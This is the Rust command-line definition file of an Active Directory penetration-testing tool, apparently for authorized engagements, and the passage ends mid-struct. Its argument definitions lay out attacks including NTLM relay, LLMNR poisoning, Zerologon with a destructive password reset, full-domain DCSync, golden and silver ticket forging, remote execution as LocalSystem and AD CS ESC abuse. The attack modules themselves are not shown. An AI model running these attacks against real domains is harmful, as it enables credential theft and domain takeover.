//! ADhammer — Active Directory security assessment and offensive tradecraft in Rust.
//! Pipeline: LDAP collect → build control-path graph → run checks → score → report.

use adhammer_collector::{Collector, LdapConfig};
use adhammer_graph::ControlGraph;
use adhammer_report::{Report, RiskConfig};
use anyhow::{Context, Result};
use clap::{Parser, Subcommand};

mod adcs_relay;
mod dcshadow;
mod esc_registry;
mod guided;
mod host_posture;
mod interactive;
mod poison;
mod session;
mod ui;
mod winrm;

#[derive(Parser)]
#[command(
    name = "adhammer",
    version,
    about = "Passive AD security assessment in Rust"
)]
struct Cli {
    /// Reuse the last saved session (skip setup prompts, go straight to the menu).
    #[arg(long)]
    old: bool,

    /// Don't persist the session (creds) to disk — for use on a client/engagement box.
    #[arg(long)]
    no_save: bool,

    /// Route ALL outbound TCP through a SOCKS5 pivot: `[user:pass@]host:port` (proxy-side DNS).
    /// Covers SMB, RPC/DCSync/Zerologon, LDAP, KDC, WinRM and the network sweep.
    #[arg(long, global = true, value_name = "[user:pass@]host:port")]
    socks: Option<String>,

    /// Emit structured JSON output (AttackResult envelope) instead of human-readable text.
    /// Applies to attack/enum/dump subcommands. Scan already emits JSON by default.
    #[arg(long, global = true)]
    json: bool,

    #[command(subcommand)]
    cmd: Option<Command>,
}

#[derive(Subcommand)]
enum Command {
    /// Passive audit: LDAP collection → control-path graph → 41 checks → scored report.
    Scan(ScanArgs),
    /// Read-only enumeration: SAMR/LSAT/network sweep/DNS zones/AD CS/DC posture/logon sessions.
    #[command(subcommand)]
    Enum(EnumCmd),
    /// Active attacks: roast/spray/abuse/coerce/relay/RBCD/DCSync/exec/WMI/LAPS/ESC1-4/golden/silver/PtT/BadSuccessor/DCShadow.
    #[command(subcommand)]
    Attack(AttackCmd),
    /// Offline / single-purpose check runners — subset of `scan` for one taxonomy at a time.
    #[command(subcommand)]
    Check(CheckCmd),
    /// Dump credentials / secrets from AD (LAPS, gMSA).
    #[command(subcommand)]
    Dump(DumpCmd),
    /// Guided: scan → correlate → confirm each weakness → validate + PoC → report.
    Auto(AutoArgs),
}

#[derive(Subcommand)]
enum CheckCmd {
    /// Run the ms-crtd ESC1-15 rule pack over pKICertificateTemplate objects
    /// collected from LDAP. Complements `scan` — no ACL walk, just the
    /// template-shape checks straight out of `ms-crtd::detect_esc`.
    Adcs(CheckAdcsArgs),
}

#[derive(Parser)]
struct CheckAdcsArgs {
    /// LDAP URL, e.g. ldaps://dc.corp.local:636
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
    /// Emit findings as JSON (default: human-readable).
    #[arg(long)]
    json: bool,
}

#[derive(Subcommand)]
enum DumpCmd {
    /// Dump LAPS local-admin passwords. Wire path over the `ms-gkdi` seed-key
    /// derivation is TODO — this subcommand today reuses the existing
    /// `attack laps` code path over dpapi-ng and prints a hint for the
    /// ms-gkdi-only route.
    Laps(DumpLapsArgs),
    /// Dump gMSA `msDS-ManagedPassword` blobs. TODO wire onto ms-gkdi for the
    /// LAPS-v2 style seed-key derivation; for now falls back to `attack gmsa`
    /// (which speaks the SEALED LDAP path directly).
    Gmsa(DumpGmsaArgs),
}

#[derive(Parser)]
struct DumpLapsArgs {
    /// Target sAMAccountName, e.g. `WIN11$`. Omit to dump every readable entry.
    #[arg(long)]
    target: Option<String>,
    /// LDAP URL (LDAPS required for the sealed channel that returns the blob).
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
    /// DC host / KDC for the GKDI GetKey call (defaults to the URL host).
    #[arg(long)]
    dc: Option<String>,
}

#[derive(Parser)]
struct DumpGmsaArgs {
    /// gMSA sAMAccountName (e.g. `gmsa_web$`).
    #[arg(long)]
    target: String,
    /// LDAP URL (LDAPS required).
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
}

#[derive(Parser)]
struct AutoArgs {
    /// LDAP URL, e.g. ldaps://dc:636
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
    /// DC host/IP for SMB/Kerberos validators (defaults to the URL host).
    #[arg(long)]
    host: Option<String>,
    /// NetBIOS domain (defaults to the collected domain).
    #[arg(long)]
    domain: Option<String>,
    /// Kerberos realm (defaults to the DNS domain, upper-cased).
    #[arg(long)]
    realm: Option<String>,
    /// KDC host (defaults to --host).
    #[arg(long)]
    kdc: Option<String>,
    /// Report output path (Markdown).
    #[arg(long, default_value = "adhammer-report.md")]
    out: String,
    /// Validate every finding without prompting (unattended).
    #[arg(long)]
    yes: bool,
    /// Skip the per-finding "Impact" attack-chain narrative in the Markdown report.
    /// The interactive card still shows it either way.
    #[arg(long)]
    no_impact: bool,
}

#[derive(Subcommand)]
enum EnumCmd {
    /// Enumerate domain users over SAMR (SMB named pipe).
    Samr(SamrArgs),
    /// Resolve a name to its SID over LSAT (\lsarpc).
    Lsa(LsaArgs),
    /// Sweep a network: live hosts, AD ports, and SMB signing (NTLM-relay targets).
    Net(NetArgs),
    /// Enumerate AD-integrated DNS zones + records over LDAP (adidnsdump-style).
    Dns(DnsArgs),
    /// Enumerate enterprise CAs and probe each for ESC8 web-enrollment exposure.
    Adcs(DnsArgs),
    /// Registry-only AD CS ESC checks (ESC6/10/11/16) over MS-RRP — needs Remote Registry.
    Esc(EscArgs),
    /// DC posture over MS-RRP + pipes: LDAP signing / channel binding + Spooler (relay/coercion enablers).
    Posture(PostureArgs),
    /// Enumerate a host's logon sessions over SRVSVC (\srvsvc) — session hunting (HasSession).
    Sessions(SessionsArgs),
    /// Enumerate logged-on users via WKSSVC (\wkssvc) — NetrWkstaUserEnum level 1 (needs local admin).
    Wkssvc(SessionsArgs),
    /// Enumerate logged-on SIDs via HKU registry enumeration over MS-RRP (often works without local admin).
    Hku(SessionsArgs),
}

#[derive(Parser)]
struct SessionsArgs {
    /// Target host or IP whose logon sessions to enumerate.
    #[arg(long)]
    host: String,
    /// Domain the bind identity belongs to (NetBIOS or DNS form, e.g. `CORP` or `corp.local`).
    #[arg(long)]
    domain: String,
    /// Bind username — sAMAccountName, `DOMAIN\user`, or `user@realm`.
    #[arg(long)]
    user: String,
    #[arg(long, default_value = "")]
    password: String,
    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
    #[arg(long)]
    nt_hash: Option<String>,
    /// Include machine-account (`$`-suffixed) principals in the output. Default is off —
    /// on a DC these flood the list with the DC's own machine-account service sessions.
    #[arg(long)]
    include_machine: bool,
}

#[derive(Parser)]
struct PostureArgs {
    /// DC host or IP.
    #[arg(long)]
    host: String,
    /// NetBIOS domain, e.g. CORP.
    #[arg(long)]
    domain: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
}

#[derive(Parser)]
struct ZerologonArgs {
    /// DC host or IP.
    #[arg(long)]
    host: String,
    /// DC NetBIOS computer name (the machine account without the `$`), e.g. DC01.
    #[arg(long)]
    netbios: String,
    /// Max handshake attempts (success is expected within ~256 on a vulnerable DC).
    #[arg(long, default_value_t = 2000)]
    attempts: u32,
    /// DESTRUCTIVE: after detection, reset the DC machine password to empty and DCSync as the DC
    /// account to prove Domain Admin. Prompts for confirmation unless --yes. Leaves the machine
    /// password empty — see the printed restore guidance.
    #[arg(long)]
    exploit: bool,
    /// Skip the exploit confirmation prompt (unattended).
    #[arg(long)]
    yes: bool,
    /// Required to arm --exploit. The reset can PERMANENTLY BREAK a single-DC domain: restore is
    /// only reliable with the original cleartext and is not guaranteed on a lone DC. Pass this only
    /// after reading that and confirming an authorized, recoverable (multi-DC or disposable) target.
    #[arg(long)]
    confirm_brick_risk: bool,
    /// NetBIOS domain (for the DCSync proof), e.g. CORP.
    #[arg(long, default_value = "")]
    domain: String,
    /// RESTORE the machine account to this NT hash (32 hex) — sets AD back to match the DC's local
    /// secret after an exploit. Run this after `--exploit` (machine password is empty) with the
    /// original DC$ hash (recorded pre-exploit, or recovered via secretsdump of $MACHINE.ACC).
    #[arg(long)]
    restore: Option<String>,
    /// FULL restore: set the machine account back to this CLEARTEXT (regenerates NT + AES keys, so
    /// the AES secure channel heals — unlike --restore which only sets the NT hash). Use the DC's
    /// current local machine password.
    #[arg(long)]
    restore_password: Option<String>,
}

#[derive(Parser)]
struct EscArgs {
    /// CA host. ESC10 is read from this host's Kdc key too, so point it at a DC-hosted CA.
    #[arg(long)]
    host: String,
    /// NetBIOS domain, e.g. CORP.
    #[arg(long)]
    domain: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    /// CA name (the `Configuration\<CA>` registry key), e.g. corp-CA.
    #[arg(long)]
    ca: String,
}

#[derive(Parser)]
struct NetArgs {
    /// Targets: CIDR (10.0.0.0/24), comma-list (a,b,c), or @file (one host per line)
    #[arg(long)]
    targets: String,
    /// Max concurrent host probes
    #[arg(long, default_value = "256")]
    concurrency: usize,
    /// Per-service checks: FTP anon, SMTP VRFY, DNS version/AXFR, NFS showmount, rsync modules,
    /// SNMP community, MSSQL/MySQL version+login, RPC/EPM surface, WinRM auth, VNC no-auth, Redis
    #[arg(long)]
    deep: bool,
    /// DNS zone to attempt AXFR against (deep DNS check); e.g. corp.local
    #[arg(long)]
    zone: Option<String>,
    /// SNMP community strings to try (deep, UDP/161); comma-separated
    #[arg(long, default_value = "public,private")]
    community: String,
}

#[derive(Subcommand)]
enum AttackCmd {
    /// Kerberos AS-REP roast + Kerberoast (RC4/AES hashcat output).
    Roast(ScanArgs),
    /// Kerberos password spray / user enumeration.
    Spray(SprayArgs),
    /// LDAP abuse: add-spn / add-member / set-password / write-rbcd.
    Abuse(AbuseArgs),
    /// Coerce the DC to authenticate to a listener (PetitPotam / MS-EFSR).
    Coerce(CoerceArgs),
    /// Zerologon (CVE-2020-1472) SAFE detection over MS-NRPC — never resets the machine password.
    Zerologon(ZerologonArgs),
    /// RBCD: S4U2Self + S4U2Proxy to impersonate a user to a target service.
    Rbcd(RbcdArgs),
    /// Constrained delegation abuse: same S4U2Self+S4U2Proxy chain via a `msDS-AllowedToDelegateTo`
    /// account with protocol transition (impersonate any user to the allowed service).
    Constrained(RbcdArgs),
    /// Ask-TGT: get a TGT with a password and write a reusable ccache (Kerberos `-k` workflows).
    Asktgt(AsktgtArgs),
    /// DCSync: replicate a target's secrets via DRSUAPI over a sealed RPC channel.
    Dcsync(DcsyncArgs),
    /// Capture NetNTLMv2 from coerced/poisoned victims (SMB listener → hashcat -m 5600).
    Capture(CaptureArgs),
    /// Poison LLMNR + NBT-NS name resolution to lure victims to us (pair with `capture`).
    Poison(PoisonArgs),
    /// NTLM relay: SMB victim → LDAP/RBCD/AD CS Web (ESC8)/ICPR (ESC11). Pick with --target.
    Relay(RelayArgs),
    /// Remote command execution as LocalSystem over SVCCTL (psexec-style service create/run/delete).
    Exec(ExecArgs),
    /// Remote command execution as LocalSystem over TSCH (atexec-style scheduled task).
    Atexec(ExecArgs),
    /// Remote command execution over WMI (DCOM → Win32_Process.Create), output captured over C$.
    Wmiexec(ExecArgs),
    /// Local secretsdump: reg-save SYSTEM+SAM, pull over C$, decrypt local NT hashes offline.
    Secretsdump(SecretsdumpArgs),
    /// Read a gMSA managed password over LDAP → NT hash (for accounts you may retrieve).
    Gmsa(GmsaArgs),
    /// Read LAPS local-admin passwords (ms-Mcs-AdmPwd / msLAPS-Password) over LDAPS.
    Laps(LapsArgs),
    /// Execute a command over WinRM (WS-Man, 5985/HTTP, NTLM + message encryption).
    Winrm(WinrmArgs),
    /// AD CS ESC1: enroll a client-auth cert with a spoofed UPN SAN on a vuln template.
    Esc1(Esc1Args),
    /// ESC1 request marshaled via `ms-icpr`: build a CSR with an
    /// attacker-supplied UPN SAN and marshal the `CertServerRequest` opnum.
    /// Sealed `\PIPE\cert` transport is not wired in this build — the command
    /// runs offline preflight + emits the marshaled bytes so the wire can be
    /// verified before a live submission.
    #[command(name = "icpr-esc1")]
    IcprEsc1(IcprEsc1Args),
    /// Golden ticket: forge a TGT for any identity with the krbtgt AES256 key (from `dcsync krbtgt`).
    Golden(GoldenArgs),
    /// Silver ticket: forge a service ticket (TGS) for an SPN with the service account's AES256 key.
    Silver(SilverArgs),
    /// Pass-the-ticket (PtT): forge golden/silver → get a service ticket → Kerberos AP-REQ over
    /// SMB → authenticate (and optionally run a command as the impersonated identity).
    ///
    /// **Rename from `pth`.** The `pth` subcommand still resolves as an alias for one release
    /// but emits a deprecation warning at runtime. The industry PTH acronym means
    /// *pass-the-hash*; `attack ptt` describes what this actually is.
    #[command(name = "ptt", visible_alias = "pth")]
    Ptt(PthArgs),
    /// Find `TRUSTED_FOR_DELEGATION` hosts (non-DC) — unconstrained-delegation abuse targets.
    Unconstrained(ScanArgs),
    /// BadSuccessor (Server 2025 dMSA) — create a delegated MSA that succeeds a chosen victim.
    Badsuccessor(BadsuccessorArgs),
    /// ESC4 — write a certificate template's attributes to make it ESC1-vulnerable.
    Esc4(Esc4Args),
    /// Shadow Credentials — thin alias over `attack abuse --action add-keycred` / `pkinit`.
    Shadowcred(ShadowcredArgs),
    /// DCShadow — default: enumerate DCSync-capable principals. `--prep <name>` registers a rogue
    /// nTDSDSA under Configuration NC (phase 1 of the Le Toux DCShadow chain); `--cleanup <name>`
    /// removes it. Full push (phase 2) is not yet implemented.
    Dcshadow(DcshadowArgs),
}

#[derive(Parser)]
struct DcshadowArgs {
    #[command(flatten)]
    scan: ScanArgs,
    /// Register a rogue nTDSDSA with this CN (phase 1). Idempotent: rerunning with the same
    /// name after a partial failure is safe. Requires Domain Admin or Configuration NC write.
    #[arg(long)]
    prep: Option<String>,
    /// Remove a rogue nTDSDSA previously created with --prep. NoSuchObject is swallowed.
    #[arg(long)]
    cleanup: Option<String>,
    /// AD site name for --prep / --cleanup [default: Default-First-Site-Name].
    #[arg(long, default_value = "Default-First-Site-Name")]
    site: String,
}

#[derive(Parser)]
struct PthArgs {
    /// Target SMB host or IP (usually the DC).
    #[arg(long)]
    host: String,
    /// KDC host or IP (for golden → TGS-REQ). Defaults to --host.
    #[arg(long)]
    kdc: Option<String>,
    /// Kerberos realm (e.g. CORP.LOCAL).
    #[arg(long)]
    realm: String,
    /// Domain SID (S-1-5-21-a-b-c).
    #[arg(long)]
    domain_sid: String,
    /// Golden mode: krbtgt AES256 key (64 hex). Mutually exclusive with --service-aes256.
    #[arg(long)]
    krbtgt_aes256: Option<String>,
    /// Silver mode: target service account AES256 key (64 hex).
    #[arg(long)]
    service_aes256: Option<String>,
    /// Forge RC4-HMAC (etype 23) — interpret the given key as an NT hash (32 hex; legacy DCs).
    #[arg(long)]
    rc4: bool,
    /// Target SPN for the service ticket (default `cifs/<host>`).
    #[arg(long)]
    spn: Option<String>,
    /// Identity to impersonate (default Administrator).
    #[arg(long, default_value = "Administrator")]
    user: String,
    /// RID of the impersonated account (default 500).
    #[arg(long, default_value_t = 500)]
    rid: u32,
    /// Group RIDs to embed.
    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
    groups: Vec<u32>,
    /// Optional command to run as LocalSystem over the Kerberos-authenticated session.
    #[arg(long)]
    command: Option<String>,
}

#[derive(Parser)]
struct SilverArgs {
    /// Kerberos realm (e.g. CORP.LOCAL).
    #[arg(long)]
    realm: String,
    /// Service key: AES256 (64 hex) by default, or the RC4/NT hash (32 hex) with --rc4.
    #[arg(long)]
    service_aes256: String,
    /// Forge an RC4-HMAC (etype 23) ticket — interpret the key as the service NT hash (legacy DCs).
    #[arg(long)]
    rc4: bool,
    /// Target SPN (e.g. cifs/dc01.corp.local).
    #[arg(long)]
    spn: String,
    /// Domain SID (S-1-5-21-a-b-c).
    #[arg(long)]
    domain_sid: String,
    /// Identity to impersonate (default Administrator).
    #[arg(long, default_value = "Administrator")]
    user: String,
    /// RID of the impersonated account (default 500).
    #[arg(long, default_value_t = 500)]
    rid: u32,
    /// Group RIDs to embed (default: Users + Domain/Schema/Enterprise Admins + GPO Creators).
    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
    groups: Vec<u32>,
    /// Write the forged service ticket to this ccache path.
    #[arg(long)]
    out: Option<String>,
}

#[derive(Parser)]
struct GoldenArgs {
    /// KDC host or IP.
    #[arg(long)]
    kdc: String,
    /// Kerberos realm (e.g. CORP.LOCAL).
    #[arg(long)]
    realm: String,
    /// krbtgt key: AES256 (64 hex) by default, or the RC4/NT hash (32 hex) with --rc4.
    #[arg(long)]
    krbtgt_aes256: String,
    /// Forge an RC4-HMAC (etype 23) ticket — interpret the key as the krbtgt NT hash (legacy DCs).
    #[arg(long)]
    rc4: bool,
    /// Domain SID (S-1-5-21-a-b-c).
    #[arg(long)]
    domain_sid: String,
    /// Identity to impersonate (default Administrator).
    #[arg(long, default_value = "Administrator")]
    user: String,
    /// RID of the impersonated account (default 500).
    #[arg(long, default_value_t = 500)]
    rid: u32,
    /// Group RIDs to embed (default: Users + Domain/Schema/Enterprise Admins + GPO Creators).
    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
    groups: Vec<u32>,
    /// Write the forged TGT to this ccache path.
    #[arg(long)]
    out: Option<String>,
    /// Optional live acceptance proof: request a service ticket for this SPN with the forged TGT.
    #[arg(long)]
    verify_spn: Option<String>,
}

#[derive(clap::ValueEnum, Clone, Debug, PartialEq, Eq)]
enum EscVariant {
    /// Default: enrollee-supplies-subject → UPN SAN in the CSR.
    Esc1,
    /// SAN as CA `pctbAttribs` request-attribute — targets CAs with
    /// `EDITF_ATTRIBUTESUBJECTALTNAME2` set on the CA (identify via `enum esc`).
    Esc6,
    /// EKUwu / CVE-2024-49019 — inject an EKU via Microsoft
    /// `Application Policies` extension against a schema-v1 template.
    Esc15,
    /// CMC EnrollOnBehalfOf — wrap a target CSR + sign as an
    /// Enrollment Agent (requires `--agent-cert` + `--agent-key`).
    Esc3,
}

#[derive(Parser)]
struct IcprEsc1Args {
    /// CA name (e.g. `corp-CA`) — target `pKIEnrollmentService.cn`.
    #[arg(long)]
    ca: String,
    /// Certificate template `cn` that permits enrollee-supplied subject/SAN.
    #[arg(long)]
    template: String,
    /// UPN to inject into the SAN (e.g. `administrator@corp.local`).
    #[arg(long = "target-upn")]
    target_upn: String,
    /// Subject CN for the CSR (default: `Recon`).
    #[arg(long, default_value = "Recon")]
    subject: String,
    /// PEM-encoded RSA private key path to sign the CSR with. If absent, a
    /// fresh 2048-bit key is generated and written alongside the CSR.
    #[arg(long)]
    key: Option<String>,
    /// Write the marshaled `CertServerRequest` stub bytes here (base64 skipped
    /// — raw DCE/RPC input stub for offline diffing / relay).
    #[arg(long, default_value = "icpr-esc1.stub")]
    out: String,
    /// Write the CSR DER here.
    #[arg(long, default_value = "icpr-esc1.csr")]
    csr_out: String,
    /// Enrollment-agent schema-version override. ms-icpr's preflight rejects
    /// templates with `min_ra_signatures > 0`; this flag forces a synthetic
    /// override for lab-only testing when the LDAP fetch is unavailable.
    #[arg(long)]
    schema_version: Option<i32>,
    /// CA host or IP for live submission via sealed \PIPE\cert. If omitted
    /// the command runs offline (writes CSR + stub only, no submit).
    #[arg(long)]
    host: Option<String>,
    /// NetBIOS domain for the sealed bind (required when --host is set).
    #[arg(long)]
    domain: Option<String>,
    /// Username (required when --host is set).
    #[arg(long)]
    user: Option<String>,
    /// Password (required when --host is set).
    #[arg(long, default_value = "")]
    password: String,

    /// ESC variant to exercise. Default `esc1` = classic SAN-in-CSR.
    #[arg(long, value_enum, default_value = "esc1")]
    esc: EscVariant,
    /// ESC6 SAN request-attribute UPN (defaults to `--target-upn`).
    /// Only used when `--esc esc6` — the SAN is sent as a
    /// `SAN:upn=<value>` line in the CA's `pctbAttribs` field.
    #[arg(long)]
    san_upn: Option<String>,
    /// ESC3: PEM path of the Enrollment Agent's certificate.
    /// Required with `--esc esc3`.
    #[arg(long)]
    agent_cert: Option<String>,
    /// ESC3: PEM path of the Enrollment Agent's RSA private key.
    /// Required with `--esc esc3`.
    #[arg(long)]
    agent_key: Option<String>,
    /// ESC15: additional EKU OID to inject via Microsoft Application
    /// Policies (default `1.3.6.1.5.5.7.3.2` = Client Authentication).
    /// Only used when `--esc esc15`.
    #[arg(long, default_value = "1.3.6.1.5.5.7.3.2")]
    esc15_eku: String,
}

#[derive(Parser)]
struct Esc1Args {
    /// Target host or IP (the CA / DC)
    #[arg(long)]
    host: String,
    #[arg(long)]
    domain: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    /// CA name, e.g. corp-CA
    #[arg(long)]
    ca: String,
    /// Vulnerable template name (enrollee-supplies-subject), e.g. VulnUser
    #[arg(long)]
    template: String,
    /// UPN to impersonate via the SAN, e.g. Administrator@corp.local
    #[arg(long)]
    upn: String,
    /// Output path for the issued cert (DER); the private key is written alongside as .key.pem
    #[arg(long, default_value = "esc1.crt")]
    out: String,
    /// After issuing, PKINIT with the cert to obtain a TGT as the impersonated user (→ .ccache)
    #[arg(long)]
    pkinit: bool,
    /// KDC `host[:port]` for --pkinit (defaults to --host)
    #[arg(long)]
    kdc: Option<String>,
}

#[derive(Parser)]
struct GmsaArgs {
    /// LDAP URL (LDAPS required — the managed password is only returned over a sealed channel)
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
    /// gMSA sAMAccountName (e.g. gmsa_web$)
    #[arg(long)]
    target: String,
}

#[derive(Parser)]
struct LapsArgs {
    /// LDAP URL (LDAPS required — the password is only returned over a sealed channel)
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
    /// Computer sAMAccountName to read (e.g. WIN11$). Omit to dump every LAPS password you can read.
    #[arg(long)]
    target: Option<String>,
}

#[derive(Parser)]
struct DnsArgs {
    /// LDAP URL, e.g. ldap://dc:389 or ldaps://dc:636
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
}

#[derive(Parser)]
struct WinrmArgs {
    /// Target host or IP
    #[arg(long)]
    host: String,
    /// WinRM port (5985 HTTP)
    #[arg(long, default_value_t = 5985)]
    port: u16,
    /// NetBIOS or DNS domain (use "." or the host for a local account)
    #[arg(long)]
    domain: String,
    #[arg(long)]
    user: String,
    #[arg(long, default_value = "")]
    password: String,
    /// Pass-the-hash: NT hash (32 hex) instead of --password
    #[arg(long)]
    nt_hash: Option<String>,
    /// Command to run (via cmd.exe /c)
    #[arg(long)]
    command: String,
}

#[derive(Parser)]
struct SecretsdumpArgs {
    /// Target host or IP
    #[arg(long)]
    host: String,
    /// NetBIOS or DNS domain
    #[arg(long)]
    domain: String,
    /// Username (needs local admin on the target)
    #[arg(long)]
    user: String,
    #[arg(long, default_value = "")]
    password: String,
    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
    #[arg(long)]
    nt_hash: Option<String>,
}

#[derive(Parser)]
struct ExecArgs {
    /// Target host or IP
    #[arg(long)]
    host: String,
    /// NetBIOS or DNS domain
    #[arg(long)]
    domain: String,
    /// Username (needs local admin on the target for SVCCTL create)
    #[arg(long)]
    user: String,
    #[arg(long, default_value = "")]
    password: String,
    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
    #[arg(long)]
    nt_hash: Option<String>,
    /// Command to run (executed as `cmd.exe /Q /c <command>` under LocalSystem)
    #[arg(long)]
    command: String,
}

#[derive(Parser)]
struct RelayArgs {
    /// SMB address to receive the coerced/poisoned victim on
    #[arg(long, default_value = "0.0.0.0:445")]
    listen: String,
    /// Target DC to relay the victim's auth to (LDAP :389)
    #[arg(long)]
    target_dc: String,
    /// AD DNS domain, for the base DN (e.g. corp.local)
    #[arg(long)]
    realm: String,
    /// Object (sAMAccountName) to write on, as the relayed victim
    #[arg(long)]
    target_object: String,
    /// Relay target: `ldap-keycred` (Shadow Cred), `ldap-rbcd` (RBCD write),
    /// `adcs-http` (ESC8), `icpr` (ESC11) — both need --ca-host.
    #[arg(long, default_value = "ldap-keycred")]
    target: String,
    /// For `ldap-rbcd`: SID of the account we control that will be granted delegation rights
    /// (typically a computer account we created — required if --target=ldap-rbcd).
    #[arg(long)]
    trustee_sid: Option<String>,
    /// For `adcs-http` (ESC8): CA web-enrollment host (e.g. `ca.corp.local`).
    #[arg(long)]
    ca_host: Option<String>,
    /// For `adcs-http`: CA template to request (default `User`).
    #[arg(long, default_value = "User")]
    ca_template: String,
    /// For `adcs-http`: HTTPS port (default 443; use 80 with `--ca-scheme http`).
    #[arg(long, default_value_t = 443)]
    ca_port: u16,
    /// For `adcs-http`: skip TLS cert verification (self-signed / internal CA is the norm).
    #[arg(long, default_value_t = true)]
    ca_insecure: bool,
}

#[derive(Parser)]
struct PoisonArgs {
    /// Our IP to hand out for every poisoned name (where `attack capture` listens)
    #[arg(long)]
    spoof_ip: std::net::Ipv4Addr,
}

#[derive(Parser)]
struct CaptureArgs {
    /// Address to listen on, e.g. 0.0.0.0:445 (needs privilege for 445)
    #[arg(long, default_value = "0.0.0.0:445")]
    listen: String,
}

#[derive(Parser)]
struct DcsyncArgs {
    /// DC host or IP
    #[arg(long)]
    host: String,
    /// NetBIOS domain, e.g. CORP
    #[arg(long)]
    domain: String,
    /// Username (needs replication rights for a real sync)
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    /// Target account to replicate (sAMAccountName or DN); omit to just test the bind
    #[arg(long)]
    target: Option<String>,
    /// Replicate ALL domain accounts (enumerate via SAMR, then DCSync each) — full secretsdump
    #[arg(long)]
    all: bool,
    /// Confirm bulk (`--all`) runs non-interactively. Required when stdout is a TTY
    /// and `--all` is set; ignored otherwise. Blocks accidental full-domain dumps from
    /// a fat-fingered flag.
    #[arg(long)]
    yes: bool,
    /// Cap the bulk (`--all`) run at N accounts. Useful for smoke-testing --all against a
    /// large domain before committing to a full dump.
    #[arg(long)]
    limit: Option<usize>,
}

#[derive(Parser)]
struct AsktgtArgs {
    /// Username (sAMAccountName)
    #[arg(long)]
    user: String,
    /// Kerberos realm, e.g. CORP.LOCAL
    #[arg(long)]
    realm: String,
    /// KDC `host[:port]`
    #[arg(long)]
    kdc: String,
    /// Password auth (AES256). Mutually exclusive with --nt-hash.
    #[arg(long)]
    password: Option<String>,
    /// NT hash (32 hex) → overpass-the-hash via RC4-HMAC (legacy / RC4-enabled DCs).
    #[arg(long)]
    nt_hash: Option<String>,
    /// Output ccache path (defaults to `<user>.ccache`)
    #[arg(long)]
    out: Option<String>,
}

#[derive(Parser)]
struct BadsuccessorArgs {
    /// LDAP URL (LDAPS strongly preferred — the dMSA link is a privileged write)
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
    /// OU/container the attacker can create objects in (e.g. `OU=Servers,DC=corp,DC=local`).
    /// Defaults to `CN=Managed Service Accounts` under the domain root.
    #[arg(long)]
    container: Option<String>,
    /// Name to give the new dMSA (a `$`-suffixed sAMAccountName is appended).
    #[arg(long)]
    dmsa_name: String,
    /// sAMAccountName of the account to succeed (typically a Domain Admin).
    #[arg(long)]
    target: String,
}

#[derive(Parser)]
struct Esc4Args {
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
    /// cn of the certificate template to weaponize (e.g. `User` or a custom one).
    #[arg(long)]
    template: String,
    /// Optional principal (sAMAccountName / SID) to grant Enroll on the template.
    /// Omit to leave the DACL untouched and only flip the flags.
    #[arg(long)]
    enrollee: Option<String>,
}

#[derive(Parser)]
struct ShadowcredArgs {
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
    /// sAMAccountName to plant the KeyCredential on.
    #[arg(long)]
    target: String,
    /// If set, also perform PKINIT with the fresh key and print the ccache path.
    #[arg(long)]
    pkinit: bool,
    /// KDC `host[:port]` (required with --pkinit).
    #[arg(long)]
    kdc: Option<String>,
    #[arg(long)]
    realm: Option<String>,
}

#[derive(Parser)]
struct RbcdArgs {
    #[arg(long)]
    kdc: String,
    #[arg(long)]
    realm: String,
    /// Controlled account (the RBCD trustee) sAMAccountName
    #[arg(long)]
    account: String,
    /// Controlled account password
    #[arg(long)]
    account_password: String,
    /// User to impersonate, e.g. Administrator
    #[arg(long)]
    impersonate: String,
    /// Target service SPN, e.g. cifs/dc01.corp.local
    #[arg(long)]
    target_spn: String,
}

#[derive(Parser)]
struct CoerceArgs {
    #[arg(long)]
    host: String,
    #[arg(long)]
    domain: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    /// Attacker host the DC should authenticate to (UNC target)
    #[arg(long)]
    listener: String,
    /// Coercion vector (pipe name): spoolss (PrinterBug, MS-RPRN — most reliable on modern
    /// DCs), lsarpc / efsrpc (PetitPotam, MS-EFSR — restricted on 2016+), netdfs (DFSCoerce,
    /// MS-DFSNM), fssagentrpc (ShadowyCoerce, MS-FSRVP — needs FS-VSS-Agent role).
    #[arg(long, default_value = "spoolss")]
    pipe: String,
    /// PrinterBug server name to open (defaults to --host; modern spoolers want the hostname/FQDN, not an IP)
    #[arg(long)]
    target: Option<String>,
}

#[derive(Parser)]
struct AbuseArgs {
    /// LDAP URL (required for the LDAP-write actions; unused by `pkinit`)
    #[arg(long)]
    url: Option<String>,
    #[arg(long)]
    user: Option<String>,
    #[arg(long)]
    password: Option<String>,
    #[arg(long)]
    insecure: bool,
    /// add-spn | add-member | set-password | add-keycred | write-rbcd | pkinit
    #[arg(long)]
    action: String,
    /// Target sAMAccountName (the object to modify; the group for add-member; the account
